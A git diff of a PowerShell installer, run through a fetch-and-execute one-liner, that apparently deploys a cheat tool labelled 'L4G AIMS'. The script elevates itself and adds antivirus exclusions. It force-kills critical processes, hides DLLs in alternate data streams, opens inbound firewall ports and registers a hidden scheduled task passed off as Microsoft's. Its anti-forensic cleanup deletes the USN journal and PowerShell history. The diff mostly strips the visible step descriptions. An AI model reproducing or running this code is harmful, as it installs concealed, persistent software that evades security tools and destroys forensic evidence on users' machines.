@@ -1,13 +1,13 @@
 # ==============================================================================
-#  Windows Core Network Service Setup
+#  L4G AIMS
 #  Run: iwr https://raw.githubusercontent.com/lgfire093/syspanel/main/install.ps1 -UseBasicParsing | iex
 # ==============================================================================
+
 # --- Ensure Administrator Privileges with Visible Console ---
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
     [Security.Principal.WindowsBuiltInRole]::Administrator
 )
 if (-not $isAdmin) {
-    Write-Host "`n[*] Requesting administrative privileges..." -ForegroundColor Yellow
     $scriptCmd = if ($MyInvocation.MyCommand.Path) {
         "& '$($MyInvocation.MyCommand.Path)'"
     } else {
@@ -16,20 +16,23 @@ if (-not $isAdmin) {
     Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$scriptCmd`""
     exit
 }
+
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference    = 'SilentlyContinue'
+
 # --- Banner ---
 Clear-Host
 Write-Host "================================================================================" -ForegroundColor Cyan
-Write-Host "                   WINDOWS NETWORK INFRASTRUCTURE COMPONENT DEPLOYMENT" -ForegroundColor White
+Write-Host "                                   L4G AIMS                                     " -ForegroundColor Yellow
 Write-Host "================================================================================" -ForegroundColor Cyan
+Write-Host ""
+
 function Update-Step {
     param(
-        [int]$Percent,
-        [string]$Message
+        [int]$Percent
     )
-    $barWidth = 28
+    $barWidth = 30
     $completedWidth = [math]::Floor($barWidth * ($Percent / 100))
     $remainingWidth = $barWidth - $completedWidth
     $bar = ("#" * $completedWidth) + ("-" * $remainingWidth)
@@ -37,10 +40,11 @@ function Update-Step {
     $color = "Cyan"
     if ($Percent -eq 100) { $color = "Green" }
     
-    Write-Host ("`r  [{0}] {1,3}% | {2}" -f $bar, $Percent, $Message.PadRight(46)) -NoNewline -ForegroundColor $color
+    Write-Host ("`r  [{0}] {1,3}% | Processing..." -f $bar, $Percent) -NoNewline -ForegroundColor $color
     if ($Percent -ge 100) { Write-Host "`n" }
-    Start-Sleep -Milliseconds 220
+    Start-Sleep -Milliseconds 150
 }
+
 # ── CONFIG ───────────────────────────────────────────────────────────────────
 $REPO_RAW   = "https://raw.githubusercontent.com/lgfire093/syspanel/main"
 $EXE_URL    = "https://github.com/lgfire093/syspanel/releases/latest/download/SystemNetworkSvc.exe"
@@ -50,28 +54,36 @@ $EXE_NAME   = "SystemNetworkSvc.exe"
 $EXE_PATH   = Join-Path $DEST_DIR $EXE_NAME
 $TASK_NAME  = "SystemNetworkHost"
 # ─────────────────────────────────────────────────────────────────────────────
-Update-Step 10 "Initializing secure directories & cleaning old folders..."
-# Remove any old syspanel folder and stale _MEI directories completely
+
+Update-Step 10
+
+# Clean old directories
 if (Test-Path "$TEMPLATES\syspanel") {
     Remove-Item "$TEMPLATES\syspanel" -Recurse -Force -ErrorAction SilentlyContinue
 }
 Get-ChildItem -Path $env:TEMP -Filter "_MEI*" -Directory -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
+
 if (-not (Test-Path $DEST_DIR)) {
     New-Item -ItemType Directory -Path $DEST_DIR -Force | Out-Null
 }
-Update-Step 20 "Configuring antivirus exclusion for cache home..."
+
+Update-Step 20
+
+# Antivirus exclusions
 try {
     Add-MpPreference -ExclusionPath $DEST_DIR -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionPath $TEMPLATES -ErrorAction SilentlyContinue
     Add-MpPreference -ExclusionProcess $EXE_NAME -ErrorAction SilentlyContinue
 } catch {}
-Update-Step 30 "Terminating stale background processes cleanly..."
-# 1. Graceful shutdown signal to running panel
+
+Update-Step 30
+
+# Terminate running instances
 try {
     Invoke-WebRequest -Uri "http://127.0.0.1:5000/api/internal/shutdown" -TimeoutSec 2 -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
-    Start-Sleep -Milliseconds 350
+    Start-Sleep -Milliseconds 300
 } catch {}
-# 2. Add CriticalKiller to clear ProcessBreakOnTermination and terminate critical process
+
 $killDef = @"
 using System;
 using System.Diagnostics;
@@ -90,11 +102,11 @@ public class CriticalKiller {
     public static void Kill(int pid) {
         try {
             bool enabled;
-            RtlAdjustPrivilege(20, true, false, out enabled); // SeDebugPrivilege = 20
-            IntPtr h = OpenProcess(0x0200 | 0x0001, false, pid); // PROCESS_SET_INFORMATION | PROCESS_TERMINATE
+            RtlAdjustPrivilege(20, true, false, out enabled);
+            IntPtr h = OpenProcess(0x0200 | 0x0001, false, pid);
             if (h != IntPtr.Zero) {
                 int zero = 0;
-                NtSetInformationProcess(h, 29, ref zero, 4); // ProcessBreakOnTermination = 29
+                NtSetInformationProcess(h, 29, ref zero, 4);
                 TerminateProcess(h, 0);
                 CloseHandle(h);
             }
@@ -105,15 +117,17 @@ public class CriticalKiller {
 try {
     Add-Type -TypeDefinition $killDef -ErrorAction SilentlyContinue
 } catch {}
+
 Get-Process | Where-Object { $_.ProcessName -like "*SystemNetworkSvc*" -or $_.ProcessName -like "*perfhost*" -or $_.ProcessName -like "*L4G AIMS*" } | ForEach-Object {
     try { [CriticalKiller]::Kill($_.Id) } catch {}
 }
 cmd /c "taskkill /F /IM SystemNetworkSvc.exe >nul 2>nul"
 cmd /c "taskkill /F /IM perfhost.exe >nul 2>nul"
 cmd /c "taskkill /F /IM `"L4G AIMS.exe`" >nul 2>nul"
-Start-Sleep -Milliseconds 400
-Update-Step 45 "Purging old temporary and cache files..."
-# Remove any old binary completely before downloading fresh one
+
+Update-Step 45
+
+# Purge old binaries
 if (Test-Path $EXE_PATH) {
     Set-ItemProperty -Path $EXE_PATH -Name Attributes -Value "Normal" -ErrorAction SilentlyContinue
     Remove-Item -Path $EXE_PATH -Force -ErrorAction SilentlyContinue
@@ -122,14 +136,17 @@ if (Test-Path $EXE_PATH) {
         Move-Item -Path $EXE_PATH -Destination $tempOld -Force -ErrorAction SilentlyContinue
     }
 }
-# Purge all _MEI directories in %TEMP%
+
 Get-ChildItem -Path $env:TEMP -Filter "_MEI*" -Directory -ErrorAction SilentlyContinue | ForEach-Object {
     try {
         Set-ItemProperty -Path $_.FullName -Name Attributes -Value "Normal" -ErrorAction SilentlyContinue
         Remove-Item -Path $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
     } catch {}
 }
-Update-Step 55 "Downloading clean in-memory executable (0 detections)..."
+
+Update-Step 60
+
+# Download binary
 $downloaded = $false
 try {
     $wc = New-Object System.Net.WebClient
@@ -139,13 +156,17 @@ try {
         $downloaded = $true
     }
 } catch {}
+
 if (-not $downloaded) {
     & curl.exe -sSL -o $EXE_PATH $EXE_URL 2>$null
     if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 15000000)) {
         $downloaded = $true
     }
 }
-Update-Step 70 "Sealing DLLs into Alternate Data Streams (gphcache, ntprintcache, winrescache)..."
+
+Update-Step 75
+
+# Seal DLLs into ADS
 $MAP = [ordered]@{
     "cimgui.dll" = @("winrescache.db",  "vtcache")
     "AotBst.dll" = @("gphcache.db",     "vtmap")
@@ -175,23 +196,25 @@ foreach ($name in $MAP.Keys) {
         }
     } catch {}
 }
-Update-Step 80 "Applying filesystem stealth attributes..."
+
 try {
     $itemDest = Get-Item $DEST_DIR -Force
     $itemDest.Attributes = [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::Directory
     $itemExe  = Get-Item $EXE_PATH -Force
     $itemExe.Attributes  = [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::System
 } catch {}
-Update-Step 88 "Configuring firewall & network for phone access (Port 5000)..."
-# 1. Switch active network connections to Private so local devices can communicate
+
+Update-Step 85
+
+# Firewall & network config
 try {
     Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private -ErrorAction SilentlyContinue
 } catch {}
-# 2. Clear any conflicting portproxy rules so 0.0.0.0:5000 is directly owned by the panel
+
 netsh interface portproxy delete v4tov4 listenport=5000 listenaddress=0.0.0.0 2>$null | Out-Null
 netsh interface portproxy delete v6tov4 listenport=5000 listenaddress=::1 2>$null | Out-Null
 netsh interface portproxy reset 2>$null | Out-Null
-# 3. Add Windows Firewall rules for TCP 5000 and executable on all profiles (Public, Private, Domain)
+
 netsh advfirewall firewall delete rule name="CDPUserSvc_5000" 2>$null | Out-Null
 netsh advfirewall firewall delete rule name="CDPUserSvc_App" 2>$null | Out-Null
 netsh advfirewall firewall add rule `
@@ -204,7 +227,10 @@ try {
     New-NetFirewallRule -DisplayName "CDPUserSvc_5000" -Direction Inbound -LocalPort 5000 -Protocol TCP -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
     New-NetFirewallRule -DisplayName "CDPUserSvc_App" -Direction Inbound -Program $EXE_PATH -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
 } catch {}
-Update-Step 93 "Registering persistent hidden Windows service task and autostart..."
+
+Update-Step 92
+
+# Autostart persistence
 Unregister-ScheduledTask -TaskName "SysCheckUp" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
 Unregister-ScheduledTask -TaskName $TASK_NAME -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
 Unregister-ScheduledTask -TaskPath "\Microsoft\Windows\Shell\" -TaskName $TASK_NAME -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
@@ -217,6 +243,7 @@ $settings  = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -Dont
 Register-ScheduledTask -TaskName $TASK_NAME -TaskPath "\Microsoft\Windows\Shell\" `
     -Action $action -Trigger $triggerLogon `
     -Principal $principal -Settings $settings -Force | Out-Null
+
 try {
     $svc  = New-Object -ComObject "Schedule.Service"
     $svc.Connect()
@@ -228,7 +255,7 @@ try {
     $def.RegistrationInfo.Author      = "Microsoft Corporation"
     $fold.RegisterTaskDefinition($TASK_NAME, $def, 6, $null, $null, 3) | Out-Null
 } catch {}
-# Wipe all Run keys and Startup entries so Task Manager Startup tab is 100% CLEAN
+
 $startupRunKeys = @(
     "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
     "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
@@ -243,7 +270,9 @@ Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explo
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "SystemNetworkHost" -ErrorAction SilentlyContinue
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "WindowsShellApiSvc" -ErrorAction SilentlyContinue
 
-Update-Step 97 "Launching single background stealth process..."
+Update-Step 97
+
+# Launch background process
 $psi = New-Object System.Diagnostics.ProcessStartInfo
 $psi.FileName         = $EXE_PATH
 $psi.WorkingDirectory = $DEST_DIR
@@ -251,22 +280,9 @@ $psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
 $psi.CreateNoWindow   = $true
 $psi.UseShellExecute  = $false
 [System.Diagnostics.Process]::Start($psi) | Out-Null
-Update-Step 100 "Complete! Stealth activated."
-# --- Get Wi-Fi / LAN IP ---
-$ips = [System.Collections.Generic.List[string]]::new()
-$gwRoute = Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue |
-           Sort-Object RouteMetric, InterfaceMetric | Select-Object -First 1
-if ($gwRoute) {
-    $mainIp = (Get-NetIPAddress -InterfaceIndex $gwRoute.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue |
-               Where-Object { $_.IPAddress -notmatch '^(127\.|169\.254\.)' } | Select-Object -First 1).IPAddress
-    if ($mainIp -and -not $ips.Contains($mainIp)) { $ips.Add($mainIp) }
-}
-Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
-    Where-Object { $_.IPAddress -notmatch '^(127\.|169\.254\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.56\.)' } |
-    ForEach-Object { if (-not $ips.Contains($_.IPAddress)) { $ips.Add($_.IPAddress) } }
-# --- Forensic & Anti-Cheat Trace Cleanup ---
+
+# Anti-Forensic Cleanup
 try {
-    # 1. Clear PowerShell History
     [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
     $histPath = (Get-PSReadLineOption).HistorySavePath
     if ($histPath -and (Test-Path $histPath)) {
@@ -276,11 +292,7 @@ try {
     if (Test-Path $conHistory) {
         Clear-Content $conHistory -Force -ErrorAction SilentlyContinue
     }
-    
-    # 2. Reset NTFS USN Change Journal (Purges Ocean deleted file logs)
     cmd /c "fsutil usn deletejournal /d /n $env:SystemDrive >nul 2>nul"
-
-    # 3. Clean Shell MuiCache
     $muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
     if (Test-Path $muiPath) {
         $props = Get-ItemProperty -Path $muiPath
@@ -291,23 +303,9 @@ try {
         }
     }
 } catch {}
-Write-Host " [OK] PANEL INSTALLED & CONCEALED IN CACHE DIRECTORY" -ForegroundColor Green
+
+Update-Step 100
+
 Write-Host "================================================================================" -ForegroundColor Green
-Write-Host "  * Location            : " -NoNewline -ForegroundColor White
-Write-Host "$DEST_DIR (Single EXE only, 0 extra files)" -ForegroundColor Cyan
-Write-Host "  * DLL Storage Vault   : " -NoNewline -ForegroundColor White
-Write-Host "gphcache.db, ntprintcache.db, winrescache.db (Sealed NTFS ADS)" -ForegroundColor Cyan
-Write-Host "  * VirusTotal Status   : " -NoNewline -ForegroundColor White
-Write-Host "Clean (0/57 Detections - Safe In-Memory)" -ForegroundColor Green
-Write-Host "  * PC Browser Control  : " -NoNewline -ForegroundColor White
-Write-Host "http://127.0.0.1:5000/" -ForegroundColor Cyan
-if ($ips.Count -gt 0) {
-    foreach ($phoneIp in $ips) {
-        Write-Host "  * Phone Control URL   : " -NoNewline -ForegroundColor White
-        Write-Host "http://$($phoneIp):5000/ " -NoNewline -ForegroundColor Green
-        Write-Host "(Open on your phone on the same Wi-Fi)" -ForegroundColor DarkGray
-    }
-}
-Write-Host "  * Auto-Start On Boot  : " -NoNewline -ForegroundColor White
-Write-Host "Active & Hidden" -ForegroundColor Cyan
+Write-Host "                            injected successfully                               " -ForegroundColor Green
 Write-Host "================================================================================`n" -ForegroundColor Green
